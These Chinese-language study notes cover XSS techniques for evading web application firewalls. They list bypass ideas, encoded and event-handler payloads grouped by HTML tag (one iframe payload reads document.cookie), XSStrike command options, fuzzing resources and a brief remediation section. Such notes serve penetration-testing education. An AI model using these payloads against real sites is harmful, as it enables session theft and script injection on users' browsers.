推荐阅读：<br />[WAF攻防实战笔记v1.0--Bypass.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/2476579/1628670716854-4df32194-55e2-4ba7-86cf-201949ca7763.pdf)<br />![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png?x-oss-process=image%2Fresize%2Cw_908%2Cresize%2Cw_908#from=url&id=s0gET&originHeight=811&originWidth=908&originalType=binary&ratio=1&status=done&style=none)

<a name="TMkGC"></a>
## 常规 WAF 绕过思路 
```bash
标签语法替换 
特殊符号干扰 
提交方式更改 
垃圾数据溢出 
加密解密算法 
结合其他漏洞绕过  
```
**安全狗waf**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628670393749-728c2af6-7c29-49ab-8f5a-909f70d247f4.png#clientId=u5d213080-7d85-4&from=paste&height=419&id=uadd1784d&originHeight=838&originWidth=1318&originalType=binary&ratio=1&size=192499&status=done&style=none&taskId=u3933f11b-276a-4352-b66f-2c50135ebfe&width=659)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628670329110-f70a4972-cf7e-4d25-9da9-b318c965db2e.png#clientId=u5d213080-7d85-4&from=paste&height=362&id=u6eb5f6da&originHeight=723&originWidth=1370&originalType=binary&ratio=1&size=68793&status=done&style=none&taskId=u3ce0d07f-7524-4793-aabf-22b12b369a1&width=685)

<a name="JvZvq"></a>
## 常见waf过滤的标签
```bash
<script>  <a>  <p>  <img>  <body> <button>  <var>  <div>  <iframe>  <object> <input> 
<textarea>  <keygen> <frameset>  <embed>  <svg>  <math>  <video>  <audio> <select>
```
**绕过方法**
```bash
可以弹窗的：alert，prompt ，confirm，base64加密，编码绕过（安全狗都没有过滤）

绕过方法有很多比如：

大小写绕过
javascript伪协议
没有分号
Flash
HTML5 新标签
Fuzz进行测试
双层标签绕过
```
**audio标签**

```
<audio src=x onerror=alert(47)>
<audio src=x onerror=prompt(1);>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
```

**video标签**

```
<video src=x onerror=prompt(1);>
<video src=x onerror=alert(48)>
```

**div标签**

```
<div style="width:expression(alert(/1/))">1</div>     ie浏览器执行
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>   url编码绕过
```

**math标签**

```
<math><a/xlink:href=javascript:prompt(1)>Xss

<math href="javascript:javascript:alert(1)">Xss</math>
```

**button标签**

```
<button onfocus=alert(1) autofocus>
<button/onclick=alert(1) >xss</button>
```

**keygen标签**

```
<keygen/onfocus=prompt(1);>
<keygen onfocus=javascript:alert(1) autofocus>
```

**object标签**

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    
      解码：<script>alert(1)</script>
```

**iframe标签**

```
<IFRAME width%3d"420" height%3d"315" frameborder%3d"0" onload%3d"alert(document.cookie)"><%2fIFRAME>
<iframe%2fsrc%3d"data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d">
<iframe srcdoc%3d'%26lt%3bbody onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b'>
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628672708198-4d7c8ebf-a562-45bf-b5aa-8252d79d2a00.png#clientId=u1613a801-9ca0-4&from=paste&height=149&id=u9ea80b8f&originHeight=298&originWidth=1378&originalType=binary&ratio=1&size=28223&status=done&style=none&taskId=u3905a4f2-b826-4d51-bbd5-b43c25212ea&width=689)
<a name="qKLSs"></a>
## xssfuzz在线fuzz工具
[https://xssfuzzer.com/fuzzer.html](https://xssfuzzer.com/fuzzer.html)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628685763484-c63dba8e-ddbd-4e1f-b7e3-2e41fa4854ac.png#clientId=u1613a801-9ca0-4&from=paste&height=407&id=ubff9d113&originHeight=814&originWidth=1680&originalType=binary&ratio=1&size=87178&status=done&style=none&taskId=u8d62eff7-e439-48a4-8b5a-65ec06c0102&width=840)
<a name="YX6jS"></a>
##  自动化工具说明  
```bash
XSStrike 主要特点反射和 DOM XSS 扫描
多线程爬虫
Context 分析
可配置的核心
检测和规避 WAF
老旧的 JS 库扫描
智能 payload 生成器
手工制作的 HTML & JavaScript 解析器
强大的 fuzzing 引擎
盲打 XSS 支持
高效的工作流
完整的 HTTP 支持
Bruteforce payloads 支持
Payload 编码
```
```bash
-h, --help 			//显示帮助信息
-u, --url 			//指定目标 URL
--data 					//POST 方式提交内容
-v, --verbose 	//详细输出
-f, --file 			//加载自定义 paload 字典
-t, --threads 	//定义线程数
-l, --level 		//爬行深度
-t, --encode 		//定义 payload 编码方式
--json 					//将 POST 数据视为 JSON
--path 					//测试 URL 路径组件
--seeds 				//从文件中测试、抓取 URL
--fuzzer 				//测试过滤器和 Web 应用程序防火墙。
--update 				//更新
--timeout 			//设置超时时间
--params 				//指定参数
--crawl 				//爬行
--proxy 				//使用代理
--blind 				//盲测试
--skip 					//跳过确认提示
--skip-dom 			//跳过 DOM 扫描
--headers 			//提供 HTTP 标头
-d, --delay 		//设置延迟

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628687047436-f08e74ab-b015-4aef-83f7-78f4998681ee.png#clientId=u1613a801-9ca0-4&from=paste&height=372&id=ua2bc7555&originHeight=743&originWidth=1543&originalType=binary&ratio=1&size=101125&status=done&style=none&taskId=u6deb238d-094d-4c99-b438-e86bc7060e8&width=771.5)<br />简单的探针绕过<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628687240408-b3630938-971e-46fb-be7a-91445e4c41ec.png#clientId=u1613a801-9ca0-4&from=paste&id=ue3eabe8e&originHeight=646&originWidth=1323&originalType=binary&ratio=1&size=73934&status=done&style=none&taskId=u97335706-f2d9-4388-9afa-e61ab5a89ab)



#安全修复方案
```bash

开启 httponly,输入过滤，输出过滤等
PHP:http://www.zuimoge.com/212.html
JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html
```

<a name="nvAlB"></a>
## 演示案例

- 手工探针 XSS 绕过 WAF 规则 
- 自动化 XSS 绕过 WAF 测试演示 
- Fuzz 下 XSS 绕过 WAF 测试演示 
- 关于 XSS 跨站安全修复建议测试  

<a name="F64x0"></a>
## 涉及资源
```bash
https://gitee.com/yhtmxl/imxss/

https://github.com/3xp10it/xwaf

https://xssfuzzer.com/fuzzer.html

https://github.com/s0md3v/XSStrike

https://bbs.pediy.com/thread-250852.htm

https://github.com/TheKingOfDuck/fuzzDicts
```
